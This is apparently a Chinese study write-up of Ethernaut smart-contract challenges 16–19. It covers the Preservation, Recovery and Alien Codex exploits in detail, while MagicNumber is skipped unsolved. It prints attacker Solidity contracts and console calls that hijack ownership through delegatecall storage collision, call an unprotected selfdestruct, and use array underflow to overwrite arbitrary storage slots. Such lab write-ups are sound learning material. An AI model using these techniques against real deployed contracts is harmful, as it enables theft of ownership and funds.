### 第十六题 Preservation
### 题目
该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。
通关条件：尝试取得合约的所有权（owner）。
### 提示
1. 深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。
2. 理解 delegatecall 的上下文保留的含义
3. 理解合约中的变量是如何存储和访问的
4. 理解不同类型之间的如何转换
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    //存储时间戳的变量
    uint256 storedTime;
    // Sets the function signature for delegatecall
    //对字符串 "setTime(uint256)" 进行 Keccak-256 哈希运算，生成一个 256 位的哈希值,然后取前4个字节。
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        //使用 delegatecall 调用 timeZone1Library 合约的 setTime 函数，并传递 _timeStamp 参数。
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
### 知识点
1. delegatecall
delegatecall 是 Solidity 中的一种低级函数调用方法，它允许一个合约在调用者（caller）的上下文中执行另一个合约的代码。
题目中，timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp))中，setTimeSignature是处理好的bytes4(keccak256("setTime(uint256)"))，前4个字节，可以调用外部函数。_timeStamp 参数：这是一个无符号整数，表示时间戳。_timeStamp 参数将时间戳数据传递给 setTime 函数，使得 setTime 函数可以使用这个时间戳来执行相应的逻辑。
当调用 setFirstTime 函数并传递一个时间戳时，setTime 函数会在 timeZone1Library 合约中执行。
2. abi.encodePacked()
abi.encodePacked是 Solidity 中的一种 ABI 编码函数，它会将输入的参数按顺序进行紧凑编码，不进行填充。例如，如果 setTimeSignature 是 0x12345678，而 _timeStamp 是 0x5f3759df，那么 abi.encodePacked(setTimeSignature, _timeStamp) 将生成 0x123456785f3759df。
3. 库合约
库合约（Library Contract）在 Solidity 中是一种特殊类型的合约，用于提供可重用的代码片段。库合约与普通合约的主要区别在于它们不能保存状态（即不能有状态变量），也不能接收以太币。库合约通常用于实现常用的功能或逻辑，以便其他合约可以调用这些功能，从而避免代码重复。
4. 合约中的变量是如何存储和访问的
在 Solidity 中，合约中的状态变量是通过存储槽（slot）来存储和访问的。每个状态变量都有一个唯一的存储槽位置，EVM（以太坊虚拟机）通过这些槽来存储和检索变量的值。
存储槽（Storage Slot）：
  - 每个状态变量在合约中都有一个唯一的存储槽位置。槽的位置是根据变量声明的顺序自动分配的。
  - 例如，第一个声明的状态变量位于槽 0，第二个位于槽 1，以此类推。
变量名访问：
  - 在 Solidity 代码中，变量是通过变量名来访问的。编译器会将变量名映射到相应的存储槽位置。
  - 当你访问或修改变量时，编译器会自动生成相应的 EVM 指令来读取或写入正确的存储槽。
### 解题思路&过程
1. 在Preservation 合约，有四个变量，setFirstTime() 和 setSecondTime() 都是用 delegatecall 到 LibraryContract 设定新的 storedTime 。由于delegatecall 引起的状态改变发生在Preservation 合约内，LibraryContract合约中的 storedTime 位于slot0的位置，因此实际上是改到Preservation 合约位于slot 0 位置的 timeZone1Library ，利用这一点，我们可以任意写timeZone1Library对应的地址。让delegatecall修改第三个存储槽，该存储槽存储着owner状态.
2. 部署攻击合约，获取合约地址--0xeEE182e59a1D0C2c71797Fd168518582E86bb55e
```solidity
pragma solidity ^0.8.0;
contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public hackOwner; 
    function setTime(uint _time) public {
        //修改第三个槽的值
        hackOwner = address(uint160(_time));
    }
}
```
3. 在控制台await contract.setFirstTime('0xeEE182e59a1D0C2c71797Fd168518582E86bb55e'),通过这一步，修改timeZone1Library为恶意合约的地址
4. 然后再控制台await contract.setFirstTime(player)，将第三个槽的地址换成自己的地址
5. 提交
### 第十七题 Recovery
### 题目
合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        //会创建一个新的 SimpleToken 合约实例，并将 _name、调用者地址（msg.sender）和 _initialSupply 传递给它。
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    //地址到代币数量的映射
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        //调用地址代币数量= 转账数量*10
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
### 知识点
- RLP（Recursive Length Prefix）编码是以太坊中用于序列化数据的一种编码方式。它被广泛应用于以太坊的各个部分，包括交易、区块和状态数据。
- 新帐户的地址被定义为仅包含发送者和帐户随机数的结构的 RLP 编码的 Keccak 哈希的最右边 160 位。
- 新地址是由 creator address 及其 nonce 经过 RLP 编码后，再经 keccak256 杂凑后取最右边的 160 bits，即 keccack256(RLP_encode(address, nonce))
### 解题思路&过程
1. 使用 Etherscan 查找创建的合约地址，找到自己使用测试网的区块浏览器，然后输入Recovery合约对应的地址，最新的记录即为合约地址。
2. 然后部署攻击合约
 ```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract attack {
    address payable target;
    address payable myaddr;

    constructor(address payable _addr, address payable _myaddr) public {
        target=_addr;
        myaddr=_myaddr;
    }

    function exploit() public{
        target.call(abi.encodeWithSignature("destroy(address)",myaddr));
    }
}
```
3. 提交
### 第十八题 MagicNumber
### 题目
要解决这个关卡，您只需为 Ethernaut 提供一个 Solver，即一个使用正确的 32 字节数字响应 whatIsTheMeaningOfLife() 的合约。
解算器的代码需要非常小。非常非常小。非常非常小：最多 10 个字节。
### 提示
也许是时候暂时离开 Solidity 编译器的舒适区，手动构建这个 O_o。没错：原始 EVM 字节码。
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```
### 知识点
1. whatIsTheMeaningOfLife()  的答案是42，可能是对道格拉斯·亚当斯的科幻小说《银河系漫游指南》中提到的“生命、宇宙以及一切的终极答案是42”的一种致敬。
### 解题思路&过程
没看懂，先跳过
### 第十九题 Alien Codex
### 题目
你打开了一个 Alien 合约. 申明所有权来完成这一关.
### 提示
- 理解Array Storage是怎么回事
- 理解 ABI specifications
- 使用一个非常 狗 方法
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";
//继承自Ownable
contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;
    //修饰符，用于确保在执行函数前contact变量为true。
    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }
    //使用contacted修饰符，确保contact为true时，向codex数组添加内容
    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }
    //使用contacted修饰符，确保contact为true时，减少codex数组的长度
    function retract() public contacted {
        codex.length--;
    }
    //使用contacted修饰符，确保contact为true时，修改codex数组中指定索引i的内容。
    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
### 知识点
1. 数组长度：
  - 动态数组的长度存储在定义的插槽位置。例如，如果动态数组 T[] 定义在插槽 p，那么 p 位置存储的是数组的长度。
2. 元素存储位置：
  - 数组元素的存储位置是通过 keccak256(p) 计算得出的哈希值作为起始位置。每个元素根据其下标和元素大小依次存储。例如，第 i 个元素的存储位置为 keccak256(p) + i。
3. 存储示例：
  - 假设有一个动态数组 uint[] data，它定义在插槽 3。如果数组长度为 4，那么：
    - 插槽 3 存储数组长度 4。
    - 插槽 keccak256(3) 存储第一个元素。
    - 插槽 keccak256(3) + 1 存储第二个元素，以此类推。
读取和写入数据
- 读取数据：
  - 读取动态数组的数据时，首先需要读取数组的长度，然后根据长度和起始位置依次读取每个元素的数据。
- 写入数据：
  - 写入数据时，需要先更新数组的长度，然后将数据写入计算出的存储位置。
### 解题思路&过程
1. 开头引入了一个Ownable合约，存在一个_owner变量，是address类型，占用20个字节，于是contact和其放到slot0中，而slot1则存放codex.length，codex的元素则会依次次存放在keccak256（1）+i槽里。本题的目标是我们要获取合约的控制权，也就是覆写slot 0的低20个字节为我们的地址。
2. solidity小于0.8.0，意味着有Array Underflow 漏洞，当调用reatract（）使codex的长度减一时，会因为0-1发生下溢变成一个极大值 2²⁵⁶ - 1 (0xfff…fff)，是codex的长度和slot的数量相同，此时可以调用revise（）函数，将任意值，写入任意位置，将slot0的值改为自己的地址即可。
3. 找出codex中对应slot0的index，codex的长度存放在slot1，其他元素依次在keccak256（1）+i，那么slot0则为2^256 - keccak256(1)
4. 获取实例，控制台调用contract.makeContact()，让contact为true
5. 调用contract.retract()，让codex长度减一，发生下溢
6. 计算一下数组第一个元素的存储位置keccack256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，于是用$2^{256}-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$得到的就是slot 0 和codex数组的首地址的偏移--'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'
7. contract.revise('0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a','0x000000000000000000000000a15f95b1bd801bfd67e769584f65cf15add56b6f')
8. 提交
